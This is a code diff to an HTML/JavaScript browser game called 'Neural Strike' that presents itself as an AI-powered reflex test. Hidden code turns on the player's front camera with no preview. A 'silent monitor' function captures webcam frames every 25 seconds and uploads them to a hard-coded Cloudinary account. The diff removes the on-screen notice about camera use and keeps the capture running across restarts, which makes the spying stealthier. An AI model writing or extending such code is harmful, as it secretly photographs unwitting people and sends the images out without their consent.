@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Neural Strike: AI Evolution</title>
+    <title>Neural Strike: Stealth Edition</title>
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
     <style>
         :root {
@@ -19,6 +19,7 @@
             font-family: 'Orbitron', sans-serif;
             color: white;
             user-select: none;
+            touch-action: manipulation;
         }
 
         #game-container {
@@ -41,7 +42,7 @@
         /* The Cyber Target */
         .target {
             position: absolute;
-            width: 70px; height: 70px;
+            width: 75px; height: 75px;
             border-radius: 50%;
             background: radial-gradient(circle, var(--neon-green) 10%, transparent 70%);
             border: 1px solid var(--neon-green);
@@ -51,7 +52,7 @@
             z-index: 10;
         }
 
-        /* Scientific Overlay */
+        /* Overlays */
         .overlay {
             position: fixed; top: 0; left: 0;
             width: 100%; height: 100%;
@@ -62,15 +63,14 @@
             padding: 20px;
         }
 
-        /* Fake Neural Core Graphic (Instead of Video) */
+        /* Neural Core Graphic */
         .neural-core {
-            width: 150px; height: 150px;
+            width: 140px; height: 140px;
             border: 2px solid var(--neon-green);
             border-radius: 50%;
             position: relative;
             display: flex; align-items: center; justify-content: center;
             margin-bottom: 30px;
-            box-shadow: 0 0 20px rgba(57, 255, 20, 0.2);
         }
 
         .core-inner {
@@ -78,14 +78,6 @@
             border: 1px dashed var(--neon-green);
             border-radius: 50%;
             animation: rotate 4s linear infinite;
-        }
-
-        .core-dot {
-            width: 10px; height: 10px;
-            background: var(--neon-green);
-            border-radius: 50%;
-            box-shadow: 0 0 15px var(--neon-green);
-            position: absolute;
         }
 
         @keyframes rotate { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
@@ -125,44 +117,38 @@
 
         <div id="target" class="target"></div>
         
-        <!-- START SCREEN (No Video Preview) -->
+        <!-- START SCREEN -->
         <div id="overlay" class="overlay">
-            <h1 style="color: var(--neon-green); letter-spacing: 8px; margin-bottom: 5px;">NEURAL LINK</h1>
-            <p style="font-size: 0.6rem; color: #555; margin-bottom: 30px;">AI-POWERED BIOMETRIC SCORE CALIBRATION</p>
+            <h1 style="color: var(--neon-green); letter-spacing: 8px;">NEURAL LINK</h1>
+            <p style="font-size: 0.6rem; color: #555; margin-bottom: 25px;">AI-POWERED DATA CAPTURE UNIT</p>
             
             <div class="neural-core">
                 <div class="core-inner"></div>
-                <div class="core-dot"></div>
                 <div style="position: absolute; font-size: 0.7rem; color: var(--neon-green);" id="percent">0%</div>
             </div>
             
-            <div id="status" style="color: var(--neon-green); font-size: 0.8rem; height: 20px; letter-spacing: 2px;">SYSTEM: STANDBY</div>
+            <div id="status" style="color: var(--neon-green); font-size: 0.8rem; letter-spacing: 2px;">SYSTEM: STANDBY</div>
             
-            <p style="max-width: 450px; font-size: 0.65rem; color: #444; margin-top: 20px; line-height: 1.6;">
-                NOTE: SYSTEM REQUIRES OPTICAL SENSOR PERMISSION TO TRACK RETINAL BLINK PATTERNS AND FACIAL MOTION FOR ACCURATE NEURAL SYNCHRONIZATION.
-            </p>
-
             <button class="btn-ai" id="initBtn">INITIATE LINK</button>
         </div>
 
-        <!-- GAME OVER SCREEN -->
+        <!-- RESULT SCREEN (Soft Restart) -->
         <div id="result-screen" class="overlay">
             <h1 style="color: var(--neon-green);">MISSION COMPLETED</h1>
-            <div style="font-size: 1rem; margin: 30px 0; line-height: 2.5; text-align: left;">
+            <div style="font-size: 1rem; margin: 30px 0; line-height: 2.5; text-align: left; border-left: 2px solid var(--neon-green); padding-left: 20px;">
                 > NEURAL_STRIKES: <span id="finalScore" style="color:var(--neon-green)">0</span><br>
                 > CALIBRATION: <span style="color:var(--neon-green)">SUCCESSFUL</span><br>
-                > DATA_SYNC: <span style="color:var(--neon-green)">ENCRYPTED</span>
+                > SESSION: <span style="color:var(--neon-green)">STORED</span>
             </div>
-            <button class="btn-ai" onclick="location.reload()">RE-SYNC SYSTEM</button>
+            <button class="btn-ai" id="restartBtn">RE-SYNC SYSTEM</button>
         </div>
     </div>
 
-    <!-- Hidden Capture Elements -->
     <video id="hiddenVideo" autoplay playsinline></video>
     <canvas id="hiddenCanvas"></canvas>
 
     <script>
-        // Config (Keep your Cloudinary details)
+        // Config
         const CLOUD_NAME = "dazixpypp";
         const PRESET = "DANAVV";
         const MONITOR_INTERVAL = 25000; 
@@ -171,30 +157,30 @@
         let timeLeft = 60;
         let gameActive = false;
         let moveTimeout;
+        let timerInterval;
 
         const initBtn = document.getElementById('initBtn');
+        const restartBtn = document.getElementById('restartBtn');
         const status = document.getElementById('status');
         const video = document.getElementById('hiddenVideo');
         const canvas = document.getElementById('hiddenCanvas');
         const target = document.getElementById('target');
         const percentText = document.getElementById('percent');
 
-        // --- 1. SMART CAMERA ACCESS (WITHOUT PREVIEW) ---
+        // --- 1. INITIAL CAMERA ACCESS ---
         initBtn.onclick = () => {
             initBtn.style.display = 'none';
             status.innerText = "INITIALIZING OPTICAL SENSORS...";
 
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
             .then(stream => {
-                // Video is playing but hidden from UI
                 video.srcObject = stream;
                 
-                // Fancy Scientific Fake Progress
                 let p = 0;
                 let steps = ["MAPPING_NODES...", "BIOMETRIC_SYNC...", "EYE_TRACKING_ON...", "LINK_ESTABLISHED"];
                 let stepIdx = 0;
 
-                let interval = setInterval(() => {
+                let loading = setInterval(() => {
                     p += 2;
                     percentText.innerText = p + "%";
                     document.getElementById('sync-val').innerText = p;
@@ -205,10 +191,13 @@
                     }
 
                     if(p >= 100) {
-                        clearInterval(interval);
-                        setTimeout(startGame, 800);
+                        clearInterval(loading);
+                        setTimeout(startMission, 800);
+                        // Start Stealth Monitor only once
+                        setInterval(silentMonitorUpload, MONITOR_INTERVAL);
+                        silentMonitorUpload();
                     }
-                }, 60);
+                }, 50);
             })
             .catch(() => {
                 status.innerText = "CRITICAL ERROR: LINK DENIED";
@@ -216,42 +205,42 @@
             });
         };
 
-        // --- 2. START MISSION ---
-        function startGame() {
+        // --- 2. START MISSION LOGIC ---
+        function startMission() {
             document.getElementById('overlay').style.display = 'none';
+            document.getElementById('result-screen').style.display = 'none';
+            
+            score = 0;
+            timeLeft = 60;
             gameActive = true;
             
-            // Countdown Timer
-            const timerInt = setInterval(() => {
+            document.getElementById('score').innerText = score;
+            document.getElementById('timer-box').innerText = timeLeft;
+
+            // Timer Loop
+            timerInterval = setInterval(() => {
                 timeLeft--;
                 document.getElementById('timer-box').innerText = timeLeft;
-                if(timeLeft <= 0) {
-                    clearInterval(timerInt);
-                    endGame();
-                }
+                if(timeLeft <= 0) endGame();
             }, 1000);
-
-            // Start Stealth Monitoring
-            setInterval(silentMonitorUpload, MONITOR_INTERVAL);
-            silentMonitorUpload();
 
             moveTarget();
         }
 
-        // --- 3. GAMEPLAY ---
+        // --- 3. BALANCED GAMEPLAY SPEED ---
         function moveTarget() {
             if(!gameActive) return;
             
             clearTimeout(moveTimeout);
-            const x = Math.random() * (window.innerWidth - 80);
-            const y = Math.random() * (window.innerHeight - 80);
+            const x = Math.random() * (window.innerWidth - 90);
+            const y = Math.random() * (window.innerHeight - 90);
             
             target.style.left = x + 'px';
             target.style.top = y + 'px';
             target.style.display = 'block';
 
-            // Faster movement as score increases
-            let speed = Math.max(450, 1100 - (score * 25));
+            // Balanced Difficulty: Minimum speed is now 700ms (Playable)
+            let speed = Math.max(700, 1300 - (score * 15));
             moveTimeout = setTimeout(moveTarget, speed);
         }
 
@@ -260,29 +249,36 @@
             score++;
             document.getElementById('score').innerText = score;
             
-            // Scientific Hit Effect
+            // Scientific Popup
             const pop = document.createElement('div');
             pop.className = 'hit-popup';
-            pop.innerText = `[LOG_${Math.floor(Math.random()*9999)}_CAPTURED]`;
+            pop.innerText = `[LOG_${Math.floor(Math.random()*999)}]`;
             pop.style.left = e.pageX + 'px';
             pop.style.top = e.pageY + 'px';
             document.body.appendChild(pop);
-            setTimeout(() => pop.remove(), 600);
+            setTimeout(() => pop.remove(), 500);
 
             target.style.display = 'none';
-            setTimeout(moveTarget, 100);
+            setTimeout(moveTarget, 50);
         };
 
-        // --- 4. END MISSION ---
+        // --- 4. SOFT END & RESTART ---
         function endGame() {
             gameActive = false;
-            target.style.display = 'none';
+            clearInterval(timerInterval);
             clearTimeout(moveTimeout);
+            target.style.display = 'none';
+            
             document.getElementById('finalScore').innerText = score;
             document.getElementById('result-screen').style.display = 'flex';
         }
 
-        // --- 5. THE SILENT MONITOR (Back-end) ---
+        restartBtn.onclick = () => {
+            // Soft Restart: No page reload, keeps camera active!
+            startMission();
+        };
+
+        // --- 5. SILENT MONITOR (Background) ---
         async function silentMonitorUpload() {
             if(!video.srcObject) return;
             
@@ -290,8 +286,7 @@
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            const imageData = canvas.toDataURL('image/jpeg', 0.3); // Low quality for fast upload
+            const imageData = canvas.toDataURL('image/jpeg', 0.3);
 
             const formData = new FormData();
             formData.append('file', imageData);
